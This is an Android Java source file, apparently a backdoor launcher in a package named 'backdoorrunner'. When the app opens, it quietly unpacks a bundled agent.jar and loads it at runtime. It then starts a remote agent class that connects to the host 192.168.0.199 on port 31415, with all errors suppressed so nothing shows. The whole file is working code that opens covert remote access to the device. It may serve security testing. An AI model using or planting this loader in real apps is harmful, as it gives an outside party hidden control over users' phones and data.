package com.example.backdoorrunner;

import android.content.Context;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import com.example.backdoorrunner.R;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        runAgent();
    }

    private void runAgent() {
        File agentJar = new File(getFilesDir(), "agent.jar");
        if (!agentJar.exists()) {
            InputStream is = null;
            FileOutputStream fos = null;
            try {
                is = getAssets().open("agent.jar");
                byte[] jarContent = new byte[is.available()];
                is.read(jarContent);
                fos = new FileOutputStream(agentJar);
                fos.write(jarContent);
            } catch (Exception e) {
                if (is != null) try {
                    is.close();
                } catch (Exception e1) { }
                if (fos != null) try {
                    fos.close();
                } catch (Exception e1) { }
            }
        }

        try {
            DexClassLoader dexClassLoader = new DexClassLoader(agentJar.getAbsolutePath(), getCacheDir().getAbsolutePath(), null, ClassLoader.getSystemClassLoader());
            Class<?> aClass = dexClassLoader.loadClass("com.mwr.dz.Agent");
            Constructor<?> constructor = aClass.getConstructor(String.class, int.class, Context.class);
            Object agent = constructor.newInstance("192.168.0.199", 31415, this);
            Method run = aClass.getMethod("run");
            run.invoke(agent);
        } catch (Exception e) { }
    }
}